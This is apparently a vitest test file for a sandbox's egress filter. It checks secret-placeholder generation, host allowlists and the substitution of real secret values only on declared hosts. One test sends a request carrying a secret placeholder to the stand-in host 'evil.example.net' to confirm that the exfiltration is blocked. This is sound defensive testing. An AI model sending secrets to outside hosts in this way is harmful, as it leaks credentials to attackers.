import { create } from "@bufbuild/protobuf";
import { describe, expect, it } from "vitest";

import { Egress } from "../../src/egress.js";
import { EventQueue } from "../../src/events.js";
import { SecretDeclSchema, SubstituteIn } from "../../src/gen/masuda/sandbox/v1/sandbox_pb.js";

const secrets = [
  create(SecretDeclSchema, { name: "HDR", value: "real-hdr", hosts: ["api.example.com"], substituteIn: [SubstituteIn.HEADER], placeholderPrefix: "tok_", placeholderLength: 32 }),
  create(SecretDeclSchema, { name: "BODY", value: "real-body", hosts: ["api.example.com"], substituteIn: [SubstituteIn.HEADER, SubstituteIn.BODY] }),
];

function setup(enabled: string[] = []) {
  const events = new EventQueue();
  const eg = new Egress(secrets, { allowedHosts: ["api.example.com"], enabledSecrets: enabled }, events);
  // The hooks Gondolin would call, in its order: onRequest, then isRequestAllowed on the result.
  const send = async (req: Request): Promise<Request> => {
    const out = ((await eg.httpHooks.onRequest!(req)) as Request | undefined) ?? req;
    if (!(await eg.httpHooks.isRequestAllowed!(out))) throw new Error("blocked by request policy");
    return out;
  };
  return { eg, events, send };
}

const reasons = (q: EventQueue) => q.after(0n).flatMap((e) => (e.event.case === "httpDenied" ? [e.event.value.reason] : []));

describe("Egress", () => {
  it("makes placeholders in the requested shape", () => {
    const { eg } = setup();
    expect(eg.placeholders.HDR).toMatch(/^tok_[A-Za-z0-9]{32}$/);
    expect(eg.placeholders.BODY).toMatch(/^masuda_secret_[A-Za-z0-9]{40}$/);
  });

  it("denies hosts outside the policy and follows setPolicy", async () => {
    const { eg, events, send } = setup();
    await expect(send(new Request("https://other.example.org/"))).rejects.toThrow(/host-not-allowed/);
    eg.setPolicy({ allowedHosts: ["*.example.org"], enabledSecrets: [] });
    await expect(send(new Request("https://other.example.org/"))).resolves.toBeDefined();
    await expect(send(new Request("https://api.example.com/"))).rejects.toThrow(/host-not-allowed/);
    expect(reasons(events)).toEqual(["host-not-allowed", "host-not-allowed"]);
  });

  it("denies a disabled secret's placeholder in headers and bodies", async () => {
    const { eg, events, send } = setup();
    await expect(send(new Request("https://api.example.com/", { headers: { authorization: `Bearer ${eg.placeholders.HDR}` } }))).rejects.toThrow(/secret-not-enabled/);
    const basic = Buffer.from(`u:${eg.placeholders.HDR}`).toString("base64");
    await expect(send(new Request("https://api.example.com/", { headers: { authorization: `Basic ${basic}` } }))).rejects.toThrow(/secret-not-enabled/);
    await expect(send(new Request("https://api.example.com/", { method: "POST", body: `k=${eg.placeholders.HDR}` }))).rejects.toThrow(/secret-not-enabled/);
    expect(reasons(events)).toEqual(["secret-not-enabled", "secret-not-enabled", "secret-not-enabled"]);
  });

  it("substitutes in headers and, only for BODY secrets, in bodies", async () => {
    const { eg, events, send } = setup(["HDR", "BODY"]);
    const h = await send(new Request("https://api.example.com/x?q=1", { headers: { authorization: `Bearer ${eg.placeholders.HDR}` } }));
    expect(h.headers.get("authorization")).toBe("Bearer real-hdr");
    const b = await send(new Request("https://api.example.com/", { method: "POST", body: `{"a":"${eg.placeholders.BODY}","b":"${eg.placeholders.HDR}"}` }));
    expect(await b.text()).toBe(`{"a":"real-body","b":"${eg.placeholders.HDR}"}`);
    const started = events.after(0n).flatMap((e) => (e.event.case === "httpStarted" ? [e.event.value] : []));
    expect(started.map((s) => [s.method, s.host, s.path])).toEqual([["GET", "api.example.com", "/x"], ["POST", "api.example.com", "/"]]);
  });

  it("refuses a secret on a host outside its own hosts even when enabled", async () => {
    const { eg, send } = setup(["BODY"]);
    eg.setPolicy({ allowedHosts: ["api.example.com", "evil.example.net"], enabledSecrets: ["BODY"] });
    await expect(send(new Request("https://evil.example.net/", { method: "POST", body: eg.placeholders.BODY }))).rejects.toThrow(/secret-not-enabled/);
  });

  it("rejects unknown names in enabled_secrets", () => {
    const { eg } = setup();
    expect(() => eg.setPolicy({ allowedHosts: [], enabledSecrets: ["NOPE"] })).toThrow(/unknown secret/);
  });
});
